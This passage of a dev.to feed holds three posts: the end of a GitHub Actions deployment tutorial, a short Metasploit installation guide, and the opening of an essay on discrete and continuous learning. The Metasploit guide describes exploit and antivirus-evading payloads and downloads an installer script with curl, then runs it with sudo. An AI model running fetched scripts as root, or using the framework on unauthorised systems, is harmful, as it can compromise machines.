&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JabTscgm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A3n785G9UwGbmdJIzPmNYNg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JabTscgm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A3n785G9UwGbmdJIzPmNYNg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And I think that’s all there is to say about the production deployment and we can take a look at the most interesting part of all this. Pull requests.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-pull-request-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Pull Request Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Again, first go through &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml"&gt;the workflow file&lt;/a&gt;, try to make sense of it on your own and then I’ll just explain what’s different here.&lt;/p&gt;

&lt;p&gt;Most importantly there is no repository for this deployment yet. We have to create it from our workflow. To have a unique name for the repository, we fetch the GraphQL ID of the pull request:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L9-L10"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L9-L10&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; The &lt;code&gt;github&lt;/code&gt; variable lets you access the context of a workflow run, e.g. the event that triggered it, including the pull request object itself.&lt;/p&gt;

&lt;p&gt;There’s a separate job that creates the repository, using a special action I created:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L13-L21"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L13-L21&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can take a look at the action itself, to see what’s actually going on:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/mktcode/create-repository-action/blob/b1dd3b3dcdcc491795ae189db97383a47f04808e/index.js#L6-L29"&gt;https://github.com/mktcode/create-repository-action/blob/b1dd3b3dcdcc491795ae189db97383a47f04808e/index.js#L6-L29&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The next job depends on the repository being created and uses the &lt;em&gt;pr-staging&lt;/em&gt; environment:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L23-L28"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-pr.yml#L23-L28&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;From there on it’s pretty much the same as the development and production workflow. The only thing missing is deleting the repository, once the pull request gets merged/closed. This is handled in &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/delete-deploy-pr.yml"&gt;a separate workflow&lt;/a&gt;. It uses &lt;a href="https://github.com/mktcode/delete-repository-action/blob/8e1765df0893c4555badce772bcd0b732e2770e3/index.js#L6-L17"&gt;another special action&lt;/a&gt; I created.&lt;/p&gt;

&lt;p&gt;An now you can have pull requests &lt;a href="https://github.com/OpenQDev/app/pull/134"&gt;like this one&lt;/a&gt; with their own automatic deployments to test the changed before merging.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DR8cZiS3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A9KXetmxMVHCfxfNiTwFxpQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DR8cZiS3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2A9KXetmxMVHCfxfNiTwFxpQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;And that’s actually it! We’re done.&lt;/strong&gt; We now have a static site project, with multiple environments, living entirely on GitHub. And this is just one possible configuration of which I’m sure is far from perfect. In fact I am working on some improvements. So maybe I will update this article soon. But I hope you got a feeling for what’s possible with GitHub Actions and Workflows and that you start experimenting and creating your own ones for your own individual purposes now.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#thanks-for%C2%A0reading"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Thanks for reading!&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;You can follow me on&lt;/em&gt; &lt;a href="https://twitter.com/@thecodelander"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt; &lt;em&gt;and&lt;/em&gt; &lt;a href="https://github.com/mktcode"&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. For longer discussions, questions, feedback and so on, I just created a&lt;/em&gt; &lt;a href="https://discord.gg/vnGDEg9Ydv"&gt;&lt;em&gt;Discord Server&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. Not sure if that really makes sense but feel free to step by and say hello. :)&lt;/em&gt;&lt;/p&gt;

</description>
      <category>github</category>
      <category>githubpages</category>
      <category>githubactions</category>
      <category>programming</category>
    </item>
    <item>
      <title>[Cybersecurity &amp; Linux Tools] How to install Metasploit?</title>
      <author>Yuma-Tsushima </author>
      <pubDate>Fri, 25 Jun 2021 20:49:08 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</guid>
      <description>&lt;p&gt;Many people have been using this tool Metasploit. You came across on it on many tutorials and wondered how do you actually install this?&lt;br&gt;
Well I will guide your through!&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-the-purpose-of-metasploit-what-do-people-even-use-it-for"&gt;
  &lt;/a&gt;
  What is the purpose of Metasploit? What do people even use it for?
&lt;/h2&gt;

&lt;p&gt;The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it’s an open-source framework, it can be easily customized and used with most operating systems.&lt;/p&gt;

&lt;p&gt;With Metasploit, the pen testing team can use ready-made or custom code and introduce it into a network to probe for weak spots. As another flavour of threat hunting, once flaws are identified and documented, the information can be used to address systemic weaknesses and prioritize solutions.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#who-uses-metasploit"&gt;
  &lt;/a&gt;
  Who uses Metasploit?
&lt;/h2&gt;

&lt;p&gt;Due to its wide range of applications and open-source availability, Metasploit is used by everyone from the evolving field of DevSecOps pros to hackers. It’s helpful to anyone who needs an easy to install, reliable tool that gets the job done regardless of which platform or language is used. The software is popular with hackers and widely available, which reinforces the need for security professionals to become familiar with the framework even if they don’t use it.&lt;/p&gt;

&lt;p&gt;Metasploit now includes more than 1677 exploits organized over 25 platforms, including Android, PHP, Python, Java, Cisco, and more. The framework also carries nearly 500 payloads, some of which include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Command shell payloads that enable users to run scripts or random commands against a host&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Dynamic payloads that allow testers to generate unique payloads to evade antivirus software&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Meterpreter payloads that allow users to commandeer device monitors using VMC and to take over sessions or upload and download files&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Static payloads that enable port forwarding and communications between networks&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#how-to-install-metasploit"&gt;
  &lt;/a&gt;
  How to install Metasploit?
&lt;/h2&gt;

&lt;p&gt;Now we have read the background information. You are ready to install!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;apt update
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt dist-upgrade
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt autoremove


&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; msfinstall

&lt;span class="nb"&gt;chmod&lt;/span&gt; +x msfinstall
&lt;span class="nb"&gt;sudo&lt;/span&gt; ./msfinstall

msfdb init

msfconsole

&lt;span class="nb"&gt;sudo &lt;/span&gt;msfupdate
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>security</category>
      <category>linux</category>
      <category>tooling</category>
    </item>
    <item>
      <title>The Particle/Wave Duality Theory of Knowledge</title>
      <author>swyx</author>
      <pubDate>Fri, 25 Jun 2021 20:29:35 +0000</pubDate>
      <link>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</link>
      <guid>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</guid>
      <description>&lt;p&gt;I've come to regard learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. &lt;/p&gt;

&lt;p&gt;If the tools we use don't respect this duality, information is lost — either writing involves too much effort, or reading requires too much context. This has implications both for people who want to learn better, as well as content creators who want to transfer knowledge better.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#discrete-vs-continuous-learning"&gt;
  &lt;/a&gt;
  Discrete vs Continuous Learning
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Books, courses, and wikis&lt;/strong&gt; are prime examples of &lt;strong&gt;discrete&lt;/strong&gt; learning. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The ideal wiki article is a complete introduction, history, and overview of a particular topic. Its value comes from being a reliable aggregate source of truth. The structure and sequencing of knowledge presented is often as valuable as the content itself.&lt;/li&gt;
&lt;li&gt;However, long books, courses, and wikis are a lot of content to consume all at once and may never be finished. The scope may be so large that it is hard to keep up to date, particularly when the &lt;em&gt;structure&lt;/em&gt; itself needs to change with the times.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Twitter, Discord, and Email Newsletters&lt;/strong&gt; offer modes of &lt;strong&gt;continuous&lt;/strong&gt; learning.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The focus is on new content, and lack of structure allows maximum flexibility. Information is also bitesize and thus very consumable. Because of the realtime/live nature and randomness of quality, there is inbuilt variable reward which keeps us as addicted as BF Skinner's pigeons.&lt;/li&gt;
&lt;li&gt;However, the lack of historical context can leave beginners out of the loop, and even experts can fall prey to &lt;a href="https://thedecisionlab.com/biases/base-rate-fallacy/"&gt;base rate neglect&lt;/a&gt;. News also has limited long term expected value due to the Lindy Effect, and therefore have a much lower signal to noise ratio. Finally, since major developments tend to spread out over time, there is often no one canonical link that you can send people to get up to speed — you "just had to be there".&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I've only mentioned examples familiar to individual learners, but this duality also exists at a company level. Do you put all your company knowledge in Notion/Sharepoint (discrete) or Slack (continuous)? Do your docs offer a complete learning path (discrete) or do people also have to read your blog and support forums (continuous)?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#particlewave-duality"&gt;
  &lt;/a&gt;
  Particle/Wave Duality
&lt;/h2&gt;

&lt;p&gt;I've already given away the analogy in the title, but this situation reminds me of the dual-slit experiment of quantum mechanics. Here's a quick one minute explainer:&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Q_h4IoPJXZw"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Perhaps you're most familiar with this in the double split experiment:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I'm no expert myself but the version that works best for the analogy I'm going for sums it up like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;As the light/electron beam is in transit, it acts like a wave.&lt;/li&gt;
&lt;li&gt;As the light/electron beam is "observed"/hits the screen, it acts like a particle.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This all has very nice parallels to the process of learning. Sometimes we are picking up knowledge in a continuous stream, sometimes we just want a big quantum of knowledge all at once. The best forms of learning combine the two modes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you learn in a continuous stream, it is useful to recap everything you learned in a post-mortem or retrospective. If you've gained a few years of experience, it's helpful to write down &lt;a href="https://www.notion.so/5bb2d99e50fdbbd15dd9622837d14e2b"&gt;Things You Believe&lt;/a&gt; or write up the guide you wish you'd had.&lt;/li&gt;
&lt;li&gt;If you learned in a discrete block, it is useful to continue that education with continuous &lt;a href="https://ncase.me/remember/"&gt;spaced repetition&lt;/a&gt; or involvement in an alumni community (many professions from finance to airline pilots even require this as "Continuing Education"!)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#the-particlewave-duality-theory-of-knowledge"&gt;
  &lt;/a&gt;
  The Particle/Wave Duality Theory of Knowledge
&lt;/h2&gt;

&lt;p&gt;The Particle/Wave Duality Theory of Knowledge defines learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. There's no point picking a side. We learn best with both, so if you are a content creator or knowledge worker, you need a way to record both. &lt;/p&gt;

&lt;p&gt;If knowledge tools don't respect this duality, users will be forced to do the work of duplicating knowledge, or lose it forever.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#paying-the-duality-cost"&gt;
  &lt;/a&gt;
  Paying the Duality Cost
&lt;/h2&gt;

&lt;p&gt;I'll motivate this with a personal example. I run &lt;a href="https://www.learninpublic.org/"&gt;the Coding Career Community&lt;/a&gt; in &lt;em&gt;two&lt;/em&gt; places - &lt;a href="http://circle.so"&gt;Circle.so&lt;/a&gt; for my async knowledge base (discrete), and Discord for my live chat (continuous). Of course, both are more continuous places of engagement compared to the book they are focused on, which is the most discrete item of all in my hierarchy (discrete-ness is a spectrum!)&lt;/p&gt;

&lt;p&gt;People might think me crazy for splitting my efforts in running &lt;em&gt;two&lt;/em&gt; communities, instead of one. But I get active users in both and they rarely overlap: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;My Circle members are nominally bigger, but far less active and conversations can drag out over days. The primary means of engagement is by the weekly Thursday recap newsletter that gets automatically sent out.&lt;/li&gt;
